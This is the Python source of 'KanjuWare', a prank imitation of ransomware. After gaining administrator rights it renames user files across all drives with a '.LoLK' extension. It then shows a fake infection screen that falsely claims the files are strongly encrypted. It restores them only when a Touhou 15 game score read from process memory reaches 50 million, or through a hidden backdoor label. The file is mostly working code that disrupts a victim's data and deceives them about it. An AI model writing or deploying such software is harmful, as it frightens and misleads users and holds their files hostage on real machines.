import ctypes
import errno
import os
import platform
import sys
import time
import threading
import tkinter as tk
from tkinter import messagebox
from pymem import Pymem
from PIL import Image, ImageTk 

def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

# ==================== Configuration ====================
TARGET_SCORE = 5000000 # The target score is set to 5 million (5000000) instead of 50 million because the score in memory is actually the displayed score divided by 10. This is a common practice in games to save memory and simplify score handling. So when the player reaches 50 million points, the value stored in memory will be 5 million (5000000). Therefore, we set TARGET_SCORE to 5000000 to correctly detect when the player has reached the required score for unlocking the files.
SCORE_ADDRESS = 0x004E40BC # This is the memory address where the score is stored in the trial version of Touhou Kanjuden. For the full version, the score is stored at 0x004E740C. The program will automatically detect which version is running and read the score from the correct address.
TARGET_EXTENSION = ".LoLK" # This is the extension that will be appended to files to simulate encryption. When the program "encrypts" a file, it will rename the file to have this extension. For example, "document.pdf" would be renamed to "document.pdf.LoLK". This allows for easy recovery by simply removing the ".LoLK" extension from the file name.
IMAGE_PATH = resource_path("assets/junko.png") # This is the path to the image file that will be displayed in the GUI. The image is used to enhance the visual presentation of the application, making it more engaging for the user. The image should be placed in the specified path relative to the main.py file.
FILE_EXTENSIONS_NEED_TO_RENAME = {
    ".pdf", ".txt", ".md", ".json", ".doc", ".docx", ".odt", ".wps",
    ".ppt", ".pptx", ".xls", ".xlsx", ".csv", ".tsv", ".sql", ".db", ".mdb", ".accdb", ".odp", ".ods",
    ".jpg", ".jpeg", ".png", ".bmp", ".gif", ".svg",
    ".mp3", ".m4a", ".aac", ".flac", ".alac", ".wav", ".mid", ".ogg", ".opus", ".aiff", ".wma", ".ape",
    ".mp4", ".mov", ".mkv", ".flv", ".avi", ".wmv", ".mpeg",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".iso",
    ".cpp", ".h", ".java", ".js", ".html", ".css", ".cs", ".go", ".rb", ".php", ".swift", ".kt", ".rs",
    ".psd", ".ai", ".indd", ".sketch", ".blend", ".fbx", ".obj", ".dwg", ".dxf", ".3ds", ".max",
    ".pmm", ".pmmx", ".pmmz", ".pmm3d", ".pmm2d", ".pmmproj", ".pmmtemplate", ".pmmbackup", ".pmx",
    ".cpr", ".song", ".dawproject", ".flp", ".als", ".logicx", ".ptf", ".ptf2", ".ptf3", ".ptf4", ".ptf5", ".ptf6", ".ptf7", ".mscz", ".sib", ".notion", ".dorico", ".npr", ".nprproj", ".nprbackup", ".nprtemplate", ".nprarchive", ".vpr", ".ustx",

    ".PDF", ".TXT", ".MD", ".JSON", ".DOC", ".DOCX", ".ODT", ".WPS",
    ".PPT", ".PPTX", ".XLS", ".XLSX", ".CSV", ".TSV", ".SQL", ".DB", ".MDB", ".ACCDB", ".ODP", ".ODS",
    ".JPG", ".JPEG", ".PNG", ".BMP", ".GIF", ".SVG",
    ".MP3", ".M4A", ".AAC", ".FLAC", ".ALAC", ".WAV", ".MID", ".OGG", ".OPUS", ".AIFF", ".WMA", ".APE",
    ".MP4", ".MOV", ".MKV", ".FLV", ".AVI", ".WMV", ".MPEG",
    ".ZIP", ".RAR", ".7Z", ".TAR", ".GZ", ".BZ2", ".ISO",
    ".CPP", ".H", ".JAVA", ".JS", ".HTML", ".CSS", ".CS", ".GO", ".RB", ".PHP", ".SWIFT", ".KT", ".RS",
    ".PSD", ".AI", ".INDD", ".SKETCH", ".BLEND", ".FBX", ".OBJ", ".DWG", ".DXF", ".3DS", ".MAX",
    ".PMM", ".PMMX", ".PMMZ", ".PMM3D", ".PMM2D", ".PMMPROJ", ".PMMTEMPLATE", ".PMMBACKUP", ".PMX",
    ".CPR", ".SONG", ".DAWPROJECT", ".FLP", ".ALS", ".LOGICX", ".PTF", ".PTF2", ".PTF3", ".PTF4", ".PTF5", ".PTF6", ".PTF7", ".MSCZ", ".SIB", ".NOTION", ".DORICO", ".NPR", ".NPRPROJ", ".NPRBACKUP", ".NPRTEMPLATE", ".NPRARCHIVE", ".VPR", ".USTX"
} # This set contains the file extensions that the program will target for "encryption" (actually just renaming). The program will scan all files on the system and if a file has one of these extensions and is not already "encrypted" (i.e., does not already have the TARGET_EXTENSION), it will rename the file to add the TARGET_EXTENSION. This simulates the effect of encryption without actually modifying the file contents, which allows for easy recovery by simply renaming the files back to their original names. The list includes common document, image, audio, video, archive, code, and design file formats in both lowercase and uppercase to ensure comprehensive coverage.
# =======================================================

# ================== High DPI Support ===================
def setup_high_dpi():
    if platform.system() == 'Windows':
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(1)
        except:
            try:
                ctypes.windll.user32.SetProcessDPIAware()
            except:
                pass
def get_scale_factor():
    if platform.system() == 'Windows':
        try:
            return ctypes.windll.user32.GetDpiForSystem() / 96.0
        except:
            hdc = ctypes.windll.user32.GetDC(0)
            dpi = ctypes.windll.gdi32.GetDeviceCaps(hdc, 88)
            ctypes.windll.user32.ReleaseDC(0, hdc)
            return dpi / 96.0
            # Linux and macOS typically handle DPI scaling automatically, but we can attempt to read GDK_SCALE for Linux
    try:
        # Some Linux environments use GDK_SCALE for scaling factor, default to 1.0 if not set
        return float(os.environ.get('GDK_SCALE', 1.0))
    except:
        return 1.0
# =====================================================

class KanjuWareApp:
    def __init__(self, root):
        scale = get_scale_factor()
        self.root = root
        self.root.title("KanjuWare v1.14 - Pure Mutation")
        BASE_W, BASE_H = 940, 600
        self.root.geometry(f"{int(BASE_W * scale)}x{int(BASE_H * scale)}")
        self.root.resizable(False, False)
        
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
        
        # State variables
        self.current_score = tk.StringVar(value="0")
        self.status_text = tk.StringVar(value="Initializing Pure Mutation...")
        self.is_unlocked = False
        
        self.setup_ui()
        self.backend_thread = threading.Thread(target=self.backend_worker, daemon=True)
        self.backend_thread.start()
        
        self.root.after(100, self.update_loop)

    def setup_ui(self):
            scale = get_scale_factor() # Get the current DPI scaling factor to adjust UI element sizes accordingly
            self.root.configure(bg="#1a1a2e")
            
            title_label = tk.Label(
                self.root, 
                text="[WARNING] Your computer has been infected!", 
                font=("Consolas", 18, "bold"), 
                fg="#ff4757", bg="#1a1a2e"
            )
            title_label.pack(pady=(15, 5))

            body_frame = tk.Frame(self.root, bg="#1a1a2e")
            body_frame.pack(fill="both", expand=True, padx=10, pady=5)
            
            left_frame = tk.Frame(body_frame, bg="#1a1a2e", width=399 * scale)
            left_frame.pack(side="left", fill="y", padx=(0, 10))
            left_frame.pack_propagate(False)  # Prevent the frame from resizing to fit its content

            try:
                image = Image.open(IMAGE_PATH)
                image = image.resize((int(399 * scale), int(512 * scale)), Image.LANCZOS)
                self.image_tk = ImageTk.PhotoImage(image)
                image_label = tk.Label(left_frame, image=self.image_tk, bg="#1a1a2e")
                image_label.pack(pady=5)
            except Exception as e:
                placeholder = tk.Label(left_frame, text="[Image not found]", font=("Consolas", 12), fg="#ffffff", bg="#1a1a2e")
                placeholder.pack(expand=True)
                print(f"[Error] Failed to load image: {e}")

            right_frame = tk.Frame(body_frame, bg="#1a1a2e")
            right_frame.pack(side="right", fill="both", expand=True)

            instruction_text = (
                "Oops, your files have been infected by \"Pure Mutation\"!\n\n"
                "What the HELL is it?\n"
                "The mutation has caused your precious data to be encrypted, including "
                "documents, images, music, and some project files. Only this program can "
                "recover the files, because the files have been \"encrypted\" using a "
                "\"high-strength encryption algorithm with a random key.\"\n\n"
                "How can I recover my files?\n"
                "That's easy, you just need to reach 50 million points in any difficulty "
                "in the \"Touhou Kanjuden\" Trial or Full version, and this program will automatically "
                "detect the process and score of \"Touhou Kanjuden\". If you do not "
                "want to lose your encryption key, do not attempt to deceive or close this program."
            )
            
            msg_label = tk.Label(
                right_frame, text=instruction_text, 
                font=("Consolas", 12), 
                fg="#ffffff", bg="#1a1a2e", justify="left",
                wraplength=440 * scale
            )
            msg_label.pack(pady=5, padx=30)
            
            score_frame = tk.Frame(self.root, bg="#16213e", bd=2 * scale, relief="groove")
            score_frame.pack(pady=15, fill="x", padx=40)
            
            status_label = tk.Label(
                score_frame, textvariable=self.status_text, 
                font=("Segoe UI", 9, "italic"), fg="#eccc68", bg="#16213e"
            )
            status_label.pack(pady=3)
            
            score_label = tk.Label(
                score_frame, text="Current Score in Memory:", 
                font=("Consolas", 10), fg="#ffffff", bg="#16213e"
            )
            score_label.pack(side="left", padx=20, pady=5)
            
            score_val = tk.Label(
                score_frame, textvariable=self.current_score, 
                font=("Consolas", 14, "bold"), fg="#2ed573", bg="#16213e"
            )
            score_val.pack(side="right", padx=20, pady=5)

            # Backdoor. Double-click the invisible label to trigger cheat unlock (for testing and emergency recovery)
            backdoor_btn = tk.Label(right_frame, text=".", fg="#1a1a2e", bg="#1a1a2e")
            backdoor_btn.pack(side="bottom", anchor="se")
            backdoor_btn.bind("<Double-Button-1>", self.cheat_unlock)

    def _safe_rename(self, old_path, new_path):
        if not os.path.exists(old_path) or os.path.exists(new_path):
            return False
        try:
            if not os.access(old_path, os.W_OK):
                return False
            os.rename(old_path, new_path)
            return True
        except (PermissionError, OSError):
            return False

    def infect_files(self):
        self.status_text.set("Pure mutation is being launched (scanning all files...)")
            
        count = 0
        for drive_letter in range(ord("A"), ord("Z") + 1):
            drive = f"{chr(drive_letter)}:/"
            if not os.path.exists(drive):
                continue
            # Skipping system-sensitive directories to avoid critical damage and improve speed. Only targeting user files with allowed extensions.
            for root_path, dirs, files in os.walk(drive):
                if "Windows" in root_path or "Program Files" in root_path or "AppData" in root_path:
                    continue
                for file in files:
                    lower_ext = os.path.splitext(file)[1].lower()
                    if lower_ext in FILE_EXTENSIONS_NEED_TO_RENAME and not file.endswith(TARGET_EXTENSION):
                        old_path = os.path.join(root_path, file)
                        new_path = old_path + TARGET_EXTENSION
                        if self._safe_rename(old_path, new_path):
                            count += 1
        print(f"[Pure Mutation] Successfully marked {count} files with {TARGET_EXTENSION}")

    def decrypt_files(self):
        self.status_text.set("Attempting to decrypt files...")
        count = 0
        for drive_letter in range(ord("A"), ord("Z") + 1):
            drive = f"{chr(drive_letter)}:/"
            if not os.path.exists(drive):
                continue
            for root_path, _, files in os.walk(drive):
                for file in files:
                    if file.endswith(TARGET_EXTENSION):
                        old_path = os.path.join(root_path, file)
                        new_path = old_path[:-len(TARGET_EXTENSION)]
                        if self._safe_rename(old_path, new_path):
                            count += 1
        print(f"[Decryption] Mutation has been lifted, successfully restored {count} files.")

    def backend_worker(self):
            self.infect_files()

            ADDR_TRIAL = 0x004E40BC
            ADDR_FULL  = 0x004E740C

            while not self.is_unlocked:
                try:
                    pm = Pymem("th15.exe")
                    self.status_text.set("Successfully locked th15.exe")
                    
                    active_address = None
                    
                    while not self.is_unlocked:
                        try:
                            if active_address is None:
                                score_trial = pm.read_int(ADDR_TRIAL)
                                score_full  = pm.read_int(ADDR_FULL)
                                
                                if score_full > 0:
                                    active_address = ADDR_FULL
                                    print("[Version Detected] Full Version locked.")
                                elif score_trial > 0:
                                    active_address = ADDR_TRIAL
                                    print("[Version Detected] Trial Version locked.")
                                
                                current_raw_score = score_trial if score_trial > 0 else score_full
                            else:
                                current_raw_score = pm.read_int(active_address)
                            
                            self.current_score.set(f"{current_raw_score}0")
                            
                            if current_raw_score >= TARGET_SCORE:
                                self.is_unlocked = True
                                self.status_text.set("Score has reached the target! Awakening files...")
                                break
                        except Exception:
                            self.status_text.set("Game connection lost, waiting again...")
                            self.current_score.set("0")
                            active_address = None
                            break
                        time.sleep(0.2)
                except Exception:
                    self.status_text.set("Waiting for Touhou Kanjuden to start (th15.exe)...")
                    self.current_score.set("0")
                    time.sleep(1.0)

    def update_loop(self):
        if self.is_unlocked:
            self.decrypt_files()
            messagebox.showinfo("Decryption Complete", "Congratulations! You have successfully reached 50 million points in Touhou Kanjuden ~ Legacy of Lunatic Kingdom. All files have been restored.")
            self.root.destroy()
            sys.exit(0)
        else:
            self.root.after(100, self.update_loop)

    def cheat_unlock(self, event):
        messagebox.showinfo("[Backdoor] You've triggered the cheat unlock! This is for testing and emergency recovery purposes. Files will be decrypted without reaching the target score.")
        self.is_unlocked = True

    def on_closing(self):
        if self.is_unlocked:
            self.root.destroy()
        else:
            messagebox.showwarning("Wanna to escape?", "Unless you complete the 50 million divisions, closing the window will not be useful (the file will not be restored).")

def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False

def relaunch_as_admin():
    if sys.platform != "win32":
        return False
    script = os.path.abspath(sys.argv[0])
    params = " ".join(f'"{arg}"' for arg in sys.argv[1:])
    try:
        result = ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
        return result > 32
    except Exception:
        return False

# ==================== Entrance ====================
if __name__ == "__main__":
    setup_high_dpi()
    if not is_running_as_admin():
        if relaunch_as_admin():
            sys.exit(0)
        else:
            ctypes.windll.user32.MessageBoxW(
                None,
                "The program requires administrator privileges to correctly detect th15.exe and access files. Please run again as an administrator.",
                "Need Administrator Privileges",
                0x10,
            )
    root = tk.Tk()
    root.withdraw()
    start_confirmation = messagebox.askyesno(
        "Start Warning",
        "Warning: Although this prank software is not actually very destructive, many unsuspecting individuals may still be frightened by it. To avoid causing serious harm or loss, please follow the steps below to perform a self-check: \n\n1. You are aware of the software's operational characteristics. \n2. You are certain that you can reverse all impacts caused by this software. \n\nIf you meet the criteria outlined in the self-check steps above, you may click \"Yes\" to proceed with the challenge. Otherwise, please click \"No\" directly and permanently delete the software.",
        icon="warning",  # Warning icon
    )
    if not start_confirmation:
        root.destroy()
        sys.exit(0)

    root.deiconify()
    app = KanjuWareApp(root)
    root.mainloop()
